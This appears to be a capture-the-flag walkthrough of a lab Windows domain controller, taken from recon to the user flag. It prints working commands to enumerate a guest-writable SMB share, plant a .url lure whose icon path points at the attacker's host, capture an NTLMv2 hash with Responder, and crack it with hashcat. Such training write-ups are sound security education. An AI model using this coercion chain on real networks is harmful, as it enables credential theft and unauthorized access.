## Overview

Breach is a medium-difficulty Windows box that is a domain controller for `breach.vl`. The foothold needs no exploit code: the DC exposes an SMB share that the `guest` account can write to, and that folder is browsed by real users. Dropping a Windows `.url` Internet Shortcut with a UNC `IconFile` coerces a domain user into authenticating to our Responder listener, leaking an NTLMv2 hash that cracks to a weak password. This post covers recon through `user.txt`.

Realistic NTLM-coercion box: guest-writable SMB share hosts a malicious .url IconFile lure, Responder catches julia.wong's NTLMv2, and hashcat cracks a weak password; no CVE, standard tooling.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | IIS 10.0 (default page) |
| 88 | Kerberos | DC indicator |
| 135/139/445 | RPC / SMB | guest auth enabled |
| 389/3268 | LDAP | domain `breach.vl` |
| 464 | kpasswd | |
| 593/636 | RPC-over-HTTP / LDAPS | |
| 1433 | MSSQL | SQL Server 2019 RTM |
| 3389 | RDP | |
| 5985 | WinRM | |

Kerberos, LDAP, SMB and MSSQL together mark this as a domain controller. The NTLM info on 1433/3389 gives us the names `BREACHDC` / `breach.vl`.

```bash
nmap -sC -sV 10.129.5.225
echo "10.129.5.225 BREACHDC.breach.vl breach.vl" | sudo tee -a /etc/hosts
```

## Enumeration

SMB allows guest authentication. Listing shares reveals a non-default share `share` with READ **and WRITE** access:

```bash
smbclient -L //10.129.5.225/ -U 'guest%'
```

Inside `share` there is a `transfer` folder containing per-user subfolders — a directory real users browse. A writable folder that other users open is the perfect place for an NTLM coercion lure.

```bash
smbclient //10.129.5.225/share -U 'guest%' -c 'ls; ls transfer\'
```

## Foothold

A Windows `.url` Internet Shortcut can set `IconFile` to a UNC path. When Explorer renders the folder, it automatically fetches that icon over SMB, authenticating to whatever host we point it at. Running Responder captures the NTLMv2 challenge/response.

Build the lure (icon points at our `tun0` IP) and upload it to the writable share:

```bash
printf '[InternetShortcut]\nURL=http://x\nWorkingDirectory=x\nIconFile=\\\\10.10.16.13\\share\\icon.ico\nIconIndex=1\n' > /tmp/@lure.url
smbclient //10.129.5.225/share -U 'guest%' -c "cd transfer; put /tmp/@lure.url @lure.url"
```

Start Responder and wait for a user to browse the folder:

```bash
sudo responder -I tun0 -w
```

Within a few seconds Responder logs an NTLMv2 hash for `BREACH\Julia.Wong`. Crack it offline:

```bash
hashcat -m 5600 julia.hash /usr/share/wordlists/rockyou.txt
# julia.wong : Computer1
```

The weak password `Computer1` falls instantly. We now have valid domain credentials and shell-equivalent access to the share as `julia.wong`.

## User flag

```bash
smbclient //10.129.5.225/share -U 'julia.wong%Computer1' -c 'get transfer\julia.wong\user.txt'
cat user.txt   # HTB{...}
```

Access as `julia.wong` achieved and the user flag captured.

Privilege escalation is left as an exercise — this post stops at user.
